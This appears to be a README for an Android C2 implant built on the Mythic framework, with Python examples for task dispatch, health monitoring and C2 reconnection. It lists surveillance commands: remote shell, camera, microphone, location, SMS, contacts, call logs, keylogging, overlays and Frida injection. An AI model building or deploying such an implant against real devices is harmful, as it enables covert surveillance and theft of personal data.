# Mythic 3.3 Framework Integration

This document describes the complete integration of the Enhanced Mythic Android Agent with the Mythic 3.3 framework, ensuring full compliance with framework standards.

## 📁 Integration Components

### 1. `mythic_integration.py` - Core Framework Integration
**Purpose**: Task parsing, response formatting, artifact collection, and file transfer handling.

#### Key Classes:
- **`MythicTaskParser`**: Validates and parses incoming Mythic tasks
- **`MythicTaskRouter`**: Routes tasks to appropriate modules with priority handling
- **`MythicResponseFormatter`**: Formats responses according to Mythic 3.3 standards
- **`MythicArtifactCollector`**: Collects and manages artifacts (files, processes, network, surveillance)
- **`MythicFileTransferHandler`**: Handles chunked file uploads/downloads
- **`MythicIntegration`**: Main integration class coordinating all components

#### Features:
- ✅ Task validation with comprehensive parameter schemas
- ✅ Automatic task routing based on command types
- ✅ Standardized response formatting (success, error, progress)
- ✅ Multi-type artifact collection (file, process, network, surveillance)
- ✅ Chunked file transfer support with progress tracking
- ✅ Base64 encoding/decoding for binary data

### 2. `command_dispatcher.py` - Command Processing Engine
**Purpose**: Command parsing with validation, module invocation with error handling, and progress reporting.

#### Key Classes:
- **`ParameterValidator`**: Advanced parameter validation with schema support
- **`ModuleInvoker`**: Handles module invocation with comprehensive error handling
- **`ProgressReporter`**: Reports progress for long-running tasks
- **`TaskQueue`**: Priority-based task queue management
- **`CommandDispatcher`**: Main command processing orchestrator

#### Features:
- ✅ Comprehensive parameter validation with type checking and constraints
- ✅ Module execution statistics and performance monitoring
- ✅ Real-time progress reporting for long-running operations
- ✅ Priority-based task queuing (HIGH, MEDIUM, LOW)
- ✅ Concurrent task execution with thread pool management
- ✅ Detailed error handling and recovery mechanisms

### 3. `agent_manager.py` - Lifecycle Management
**Purpose**: Agent lifecycle management, health monitoring, auto-recovery mechanisms, and update support.

#### Key Classes:
- **`HealthMonitor`**: Comprehensive system and agent health monitoring
- **`AutoRecoveryManager`**: Automated recovery and self-healing system
- **`UpdateManager`**: Agent update and migration handling
- **`AgentManager`**: Main lifecycle management coordinator

#### Features:
- ✅ Real-time health monitoring (CPU, memory, disk, network, connectivity)
- ✅ Automated recovery actions (memory cleanup, module restart, C2 reconnect)
- ✅ Agent state management with history tracking
- ✅ Update/migration support with rollback capabilities
- ✅ Graceful shutdown with signal handling
- ✅ Configurable thresholds and recovery policies

## 🚀 Quick Start

### Basic Usage

```python
from mythic_integration import MythicIntegration
from command_dispatcher import CommandDispatcher
from agent_manager import AgentManager
from agent.core_agent import MythicAgent

# Initialize core agent
core_agent = MythicAgent()

# Initialize integration components
mythic_integration = MythicIntegration(
    agent_id=core_agent.device_id,
    callback_id=core_agent.campaign
)

command_dispatcher = CommandDispatcher(
    agent_instance=core_agent,
    mythic_integration=mythic_integration,
    max_concurrent_tasks=5
)

agent_manager = AgentManager(
    agent_instance=core_agent,
    mythic_integration=mythic_integration
)

# Start all components
agent_manager.start()
command_dispatcher.start()
```

### Processing Mythic Tasks

```python
# Incoming Mythic task
mythic_task = {
    "task_id": "screenshot_001",
    "command": "screenshot",
    "timestamp": int(time.time()),
    "parameters": {
        "quality": 90,
        "format": "png",
        "display_id": 0
    },
    "operator": "analyst1"
}

# Process through dispatcher
task_id = command_dispatcher.dispatch_task(mythic_task)

# Check task status
status = command_dispatcher.get_task_status(task_id)
print(f"Task Status: {status}")
```

### Health Monitoring

```python
# Get current health metrics
health_metrics = agent_manager.get_health_metrics()
print(f"Health Status: {health_metrics['status']}")
print(f"CPU Usage: {health_metrics['current']['system']['cpu_percent']}%")
print(f"Memory Usage: {health_metrics['current']['system']['memory_percent']}%")

# Configure health monitoring
agent_manager.configure_health_monitoring(
    check_interval=30,  # Check every 30 seconds
    thresholds={
        "cpu_warning": 70.0,
        "cpu_critical": 90.0,
        "memory_warning": 75.0,
        "memory_critical": 90.0
    }
)
```

### Auto-Recovery

```python
# Configure auto-recovery
agent_manager.configure_auto_recovery(
    enabled=True,
    max_attempts=3,
    cooldown=300  # 5 minutes between recovery attempts
)

# Manually trigger recovery
success = agent_manager.trigger_recovery("memory_cleanup")
print(f"Recovery Action Success: {success}")
```

## 📊 Supported Task Types

### File Operations
- **`download`**: File download with chunked transfer
- **`upload`**: File upload with validation
- **`ls`**: Directory listing with filters
- **`cat`**: File content reading
- **`rm`**: File deletion
- **`mkdir`**: Directory creation

### System Operations
- **`shell`**: Command execution with timeout
- **`ps`**: Process listing with filtering
- **`kill`**: Process termination
- **`whoami`**: User identification
- **`id`**: User/group information

### Surveillance Operations
- **`screenshot`**: Screen capture with quality control
- **`camera`**: Camera capture with duration control
- **`microphone`**: Audio recording
- **`location`**: GPS location retrieval

### Communication Operations
- **`sms`**: SMS management (list, send, read)
- **`call_log`**: Call history access
- **`contacts`**: Contact list retrieval

### Advanced Operations
- **`frida`**: Frida script injection
- **`overlay`**: UI overlay operations
- **`keylog`**: Keystroke logging

## 🔧 Configuration Options

### Task Processing
```python
# Configure command dispatcher
dispatcher = CommandDispatcher(
    agent_instance=agent,
    mythic_integration=integration,
    max_concurrent_tasks=10  # Adjust based on system capacity
)
```

### Health Monitoring
```python
# Health monitoring thresholds
thresholds = {
    "cpu_critical": 90.0,      # CPU usage critical threshold
    "cpu_warning": 70.0,       # CPU usage warning threshold  
    "memory_critical": 90.0,   # Memory usage critical threshold
    "memory_warning": 75.0,    # Memory usage warning threshold
    "disk_critical": 95.0,     # Disk usage critical threshold
    "disk_warning": 85.0,      # Disk usage warning threshold
    "connectivity_timeout": 300 # C2 connectivity timeout (seconds)
}
```

### File Transfer
```python
# Configure file transfer handler
file_handler = MythicFileTransferHandler(
    agent_id="agent_001",
    chunk_size=1024000  # 1MB chunks (adjust based on network conditions)
)
```

## 📈 Monitoring and Metrics

### Health Metrics
The system tracks comprehensive health metrics:

- **System Metrics**: CPU usage, memory usage, disk usage, network connections
- **Agent Metrics**: Loaded modules, active tasks, completed tasks, failed tasks
- **Connectivity**: C2 connectivity status, last beacon timestamp

### Performance Metrics
Module execution statistics include:
- Total calls per module
- Success/failure rates
- Average execution times
- Last called timestamps

### Recovery Actions
Available auto-recovery actions:
- **`memory_cleanup`**: Garbage collection and cache clearing
- **`module_restart`**: Restart agent modules
- **`c2_reconnect`**: Reconnect to C2 server
- **`task_queue_flush`**: Clear stuck tasks
- **`full_restart`**: Complete agent restart

## 🔒 Security Features

### Artifact Collection
Automatic collection of forensic artifacts:
- File access operations
- Process creation/termination
- Network connections
- Registry modifications (if applicable)
- Surveillance activities

### Encryption Support
- Task parameter encryption/decryption
- Response data encryption
- File transfer encryption
- Configuration encryption

### Error Handling
- Comprehensive error catching and logging
- Graceful degradation on failures
- Automatic retry mechanisms
- Safe failure modes

## 🧪 Testing

### Run Integration Tests
```bash
python mythic_integration_example.py
```

### Run Individual Component Tests
```python
# Test task parsing
from mythic_integration import MythicTaskParser

parser = MythicTaskParser()
task = parser.parse_task({
    "task_id": "test_001",
    "command": "screenshot", 
    "timestamp": 1234567890,
    "parameters": {"quality": 80}
})

# Test parameter validation
from command_dispatcher import ParameterValidator

validator = ParameterValidator()
validated = validator.validate_parameters("screenshot", {"quality": "80"})
```

## 🔄 Integration with Existing Agent

To integrate with your existing Mythic Android Agent:

1. **Import the integration modules**:
```python
from mythic_integration import MythicIntegration
from command_dispatcher import CommandDispatcher
from agent_manager import AgentManager
```

2. **Initialize in your agent's `__init__` method**:
```python
def __init__(self, config_path=None):
    # Your existing initialization code
    ...
    
    # Add Mythic 3.3 integration
    self.mythic_integration = MythicIntegration(self.device_id, self.campaign)
    self.command_dispatcher = CommandDispatcher(self, self.mythic_integration)
    self.agent_manager = AgentManager(self, self.mythic_integration)
```

3. **Update your task handling**:
```python
def handle_task(self, task):
    # Replace existing task handling with:
    return self.command_dispatcher.dispatch_task(task)
```

4. **Start management components**:
```python
def run(self):
    # Your existing startup code
    ...
    
    # Start Mythic integration components
    self.agent_manager.start()
    self.command_dispatcher.start()
```

## 📚 API Reference

### MythicIntegration Class
```python
class MythicIntegration:
    def process_task(self, raw_task) -> Dict[str, Any]
    def format_response(self, task_id, result, response_type="success") -> Dict[str, Any]
    def collect_artifact(self, artifact_type, **kwargs) -> Dict[str, Any]
    def handle_file_operation(self, operation, **kwargs) -> Dict[str, Any]
    def get_status(self) -> Dict[str, Any]
```

### CommandDispatcher Class
```python
class CommandDispatcher:
    def start(self)
    def stop(self)
    def dispatch_task(self, raw_task) -> str
    def get_task_status(self, task_id) -> Optional[Dict]
    def get_dispatcher_status(self) -> Dict[str, Any]
```

### AgentManager Class
```python
class AgentManager:
    def start(self)
    def shutdown(self, timeout=30)
    def restart(self)
    def get_status(self) -> Dict[str, Any]
    def get_health_metrics(self, include_history=False) -> Dict[str, Any]
    def trigger_recovery(self, action=None) -> bool
    def configure_health_monitoring(self, **kwargs)
    def configure_auto_recovery(self, **kwargs)
```

## 🎯 Best Practices

1. **Resource Management**: Monitor system resources and configure appropriate thresholds
2. **Error Handling**: Always check task status and handle failures gracefully
3. **Security**: Enable artifact collection for audit trails
4. **Performance**: Adjust concurrent task limits based on system capacity
5. **Recovery**: Configure auto-recovery for production deployments
6. **Monitoring**: Enable health monitoring in production environments

## 🐛 Troubleshooting

### Common Issues

**Issue**: Tasks getting stuck in queue
**Solution**: Check system resources and increase timeout values or reduce concurrent tasks

**Issue**: High memory usage
**Solution**: Enable auto-recovery with memory cleanup or reduce task history retention

**Issue**: Health monitoring showing critical status
**Solution**: Check thresholds configuration and system capacity

**Issue**: File transfers failing
**Solution**: Verify network connectivity and adjust chunk sizes

### Debug Logging
Enable debug logging for troubleshooting:
```python
import logging
logging.getLogger('mythic_integration').setLevel(logging.DEBUG)
logging.getLogger('command_dispatcher').setLevel(logging.DEBUG)
logging.getLogger('agent_manager').setLevel(logging.DEBUG)
```

---

## ✅ Compliance Checklist

- [x] **Task Parsing and Routing**: Comprehensive task validation and routing
- [x] **Response Formatting**: Mythic 3.3 standard response formatting
- [x] **Artifact Collection**: Multi-type artifact collection and submission
- [x] **File Transfer Handling**: Chunked upload/download with progress tracking
- [x] **Command Processing**: Parameter validation with error handling
- [x] **Module Invocation**: Robust module execution with statistics
- [x] **Result Aggregation**: Consistent result formatting and aggregation
- [x] **Progress Reporting**: Real-time progress for long-running tasks
- [x] **Agent Lifecycle**: Complete lifecycle management with state tracking
- [x] **Health Monitoring**: Comprehensive system and agent health monitoring
- [x] **Auto-Recovery**: Automated recovery mechanisms with configurable policies
- [x] **Update Support**: Update and migration capabilities with rollback

This integration provides full compliance with Mythic 3.3 framework requirements while maintaining backward compatibility and adding advanced management capabilities.
